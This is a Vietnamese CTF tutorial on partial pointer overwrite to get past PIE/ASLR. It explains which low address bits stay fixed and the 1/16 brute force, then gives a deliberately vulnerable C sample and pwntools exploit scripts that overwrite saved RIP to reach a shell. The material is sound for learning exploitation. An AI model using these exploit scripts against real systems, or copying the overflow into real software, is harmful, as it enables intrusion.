Partial Overwrite

PIE/ASLR làm địa chỉ random — nhưng các bit thấp cố định (trong cùng trang 0x1000, 12 bit thấp không đổi; offset nội module cố định). Chỉ ghi đè 1–2 byte thấp của một con trỏ → chuyển hướng tới đích gần mà không cần leak. Nếu nibble thứ 3 ngẫu nhiên → brute 1/16. Bài này: bit nào cố định/random, số thật.

00 / TÓM TẮT 1 PHÚT

Bài này nói về cái gì?

Nguyên lý: một con trỏ (saved RIP, GOT, fd) = base_random + offset_cố_định. ASLR random hóa base theo trang (0x1000) → 12 bit thấp (3 nibble) KHÔNG đổi. Ghi đè chỉ byte thấp → thay offset trong cùng vùng, không cần biết base.

Ghi 1 byte: đổi được offset trong cùng 0x100 (2 nibble thấp cố định + 2 nibble ta ghi). Ghi 2 byte: tới 0x1000 — nhưng nibble thứ 3 (bit 12-15) bị random → brute.

Brute 1/16: nếu đích cần nibble thứ 3 khác giá trị cố định, nibble đó random 1/16 → chạy lại ~16 lần tới khi trúng.

Nếu chỉ nhớ một điều: 12 bit thấp cố định; ghi 1 byte = đích cùng 0x100; ghi 2 byte = brute nibble thứ 3 (1/16).

⚡ COMBAT CARD — dán chạy khi đang thi
🚦 Dùng khi

PIE/ASLR không leak được, nhưng đích (win/gadget) gần con trỏ hiện tại (cùng trang/module). Overflow đủ ghi 1-2 byte thấp của saved RIP/GOT.

địa chỉ = 0x5555 5555 5xxx

ghi 1 byte → đổi 2 nibble thấp (cùng 0x100)
ghi 2 byte → tới 0x1000, nibble thứ 3 RANDOM → brute
⚡ Ghi 2 byte (có brute)

# nibble thứ 3 của win có thể != của hàm hiện tại → brute 1/16

⚠️ Nhớ

Nếu đích CÙNG trang với con trỏ (12 bit thấp đủ) → ghi 2 byte mà 2 nibble đầu giống → KHỎI brute. Chỉ brute khi nibble thứ 3 khác. Ghi đủ byte (p8/p16), đừng thêm null thừa.

01 / NỀN TẢNG BẮT BUỘC

ASLR random theo TRANG

ASLR không random từng byte — nó random base của mỗi vùng, và base luôn căn trang 0x1000 (12 bit thấp = 0). Nghĩa là: với một con trỏ addr = base + off, phần off & 0xfff (12 bit thấp) cố định qua mọi lần chạy (vì off cố định, base có 12 bit thấp = 0). Nên 3 nibble cuối của mọi địa chỉ trong module là bất biến — ta biết chúng mà không cần leak.

Định nghĩa nhanh

partial overwrite

Ghi đè vài byte thấp con trỏ.

Đơn vị căn ASLR; 12 bit thấp cố định.

nibble

4 bit = 1 ký tự hex.

brute 1/16

Đoán 1 nibble ngẫu nhiên.

PIE

Binary cũng bị ASLR (base 0x55…).

p8/p16

pwntools đóng gói 1/2 byte.

02 / VÌ SAO CÓ KỸ THUẬT

Không leak vẫn chuyển hướng được

Khi PIE bật mà không có cách leak (không fmt, không hàm in), full-ROP bất khả vì không biết base. Nhưng nếu đích (hàm win, một gadget) nằm gần địa chỉ ta đang kiểm soát (cùng trang/cùng vài trang), ta chỉ cần sửa offset — tức byte thấp. Partial overwrite biến "không leak" thành "chuyển hướng cục bộ", đổi lấy chút may rủi (brute). Rất hay dùng để gọi win() trong đề PIE không leak.

03 / BIT CỐ ĐỊNH · MỤC LÕI

Ghi bao nhiêu byte? (số thật)

Giả sử saved RIP hiện tại = 0x5555 5555 5189 (return về main+X), đích win = 0x5555 5555 5234. So sánh:

saved RIP:  0x555555555189
win:        0x555555555234
            └─ 10 nibble giống ─┘ └─ KHÁC: 234 vs 189 ─┘
# 3 nibble cuối (0x234) khác nhưng đều < 0x1000 → CÙNG TRANG → ghi 2 byte đủ, KHỎI brute!
payload = b"A"*OFF + p16(0x5234)   # 2 byte thấp = win
Cùng trang = mayNếu đích cùng trang (12 bit thấp đủ mô tả, 2 nibble cao của 2-byte-ghi giống nhau) → ghi 2 byte xác định, không brute. Nếu nibble thứ 3 khác (vd win ở trang kế: 0x6234 vs 0x5189) → nibble đó random → brute 1/16.

Bảng: ghi N byte đổi được gì

04 / BRUTE 1/16

Khi nibble thứ 3 ngẫu nhiên

Nếu đích khác trang: nibble thứ 3 (bit 12-15) của đích khác với con trỏ hiện tại, mà bit này bị ASLR random. Khi ghi 2 byte, ta đặt nibble đó = giá trị đích, nhưng base random làm nó đúng chỉ 1/16 lần → chạy lại ~16 lần.

# win = base + 0x1234 ; saved RIP = base + 0x0189
# ghi p16(0x1234): nibble thứ 3 = 1, nhưng base bit12-15 random
# → đúng khi (base >> 12) & 0xf khớp → 1/16
for _ in range(40):          # 40 lần đủ cho 1/16 (xác suất cao)
    p = process(exe.path)
    p.send(b"A"*OFF + p16(0x1234))
    r = p.recvall(timeout=1); p.close()
    if b"win" in r: break
Giảm bruteNếu có thể, chọn đích CÙNG trang với con trỏ (ghi 2 byte, 2 nibble cao giống) → xác suất 1/1 (không brute). Chỉ brute khi bắt buộc khác trang.

07 / EXPLOIT ĐẦY ĐỦ

PIE không leak → partial RIP → win

// vuln.c — gcc vuln.c -o vuln -pie -fno-stack-protector  (PIE, không có leak)
void win(){ system("/bin/sh"); }
int main(){ char b[0x20]; read(0, b, 0x30); }   // overflow tới saved RIP
# BẢN A — win cùng trang với saved RIP → ghi 2 byte, KHÔNG brute.
from pwn import *
exe = ELF("./vuln", checksec=False)
p = process(exe.path)

OFF = 0x28                          # tới saved RIP
# win offset = 0x1234 (ví dụ); saved RIP return main = 0x11xx cùng trang
target_low = exe.sym.win & 0xffff    # 2 byte thấp của win
p.send(b"A"*OFF + p16(target_low))   # ghi đè 2 byte saved RIP → win
p.interactive()
Thành thậtOFF=0x28, offset win/retaddr là của binary mẫu. Nếu win & retaddr cùng nibble thứ 3 (cùng trang) → ghi 2 byte xác định, 1/1. Kiểm bằng gdb: p/x &win vs saved RIP.
# BẢN B — win khác trang → nibble thứ 3 random → brute ~16 lần.
from pwn import *
exe = ELF("./vuln", checksec=False)
OFF = 0x28; target_low = exe.sym.win & 0xffff   # vd 0x1234

for i in range(60):
    try:
        p = process(exe.path)
        p.send(b"A"*OFF + p16(target_low))
        r = p.recvall(timeout=0.5); p.close()
        if b"$" in r or b"flag" in r:    # dấu hiệu shell/thành công
            log.success(f"trúng sau {i} lần"); break
    except EOFError:
        continue                            # crash = nibble sai, thử lại
Brute 1/16Nibble thứ 3 random → ~16 lần trung bình. 60 vòng gần như chắc trúng. Mỗi crash = đoán sai; "sống + output đúng" = trúng.
# BẢN C — pwnld pwnretry tự lặp khi crash.
from pwnld import *
exe = ELF("./vuln", checksec=False)
OFF = 0x28; target_low = exe.sym.win & 0xffff

@pwnretry(60)
def go():
    p = start()
    p.send(b"A"*OFF + p16(target_low))
    p.recvuntil(b"$", timeout=1)   # raise nếu không có shell → retry
    return p
go().interactive()
pwnldpwnretry gói vòng brute: tự spawn lại khi thất bại (crash/timeout). Rất gọn cho partial overwrite.
